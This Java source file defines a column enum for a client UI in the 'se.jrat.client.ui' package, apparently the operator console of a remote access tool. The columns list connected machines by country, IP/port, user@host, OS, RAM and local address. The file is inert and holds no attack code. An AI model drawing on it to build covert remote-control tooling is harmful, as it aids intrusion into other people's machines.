package se.jrat.client.ui;

public enum Columns {

	COUNTRY("Country", true),
	ID("ID", true),
	STATUS("Status", true),
	IP("IP/Port", true),
	PING("Ping", true),
	USER_HOST("User@Host", true),
	OPERATINGSYSTEM("Operating System", true),
	RAM("RAM", true),
	LOCAL_ADDRESS("Local Address", true),
	VERSION("Version", true);

	private String name;
	private boolean defaultv;

	private Columns(String name, boolean defaultv) {
		this.name = name;
		this.defaultv = defaultv;
	}
	
	public String getName() {
		return name;
	}

	public boolean isDefault() {
		return defaultv;
	}
	
}
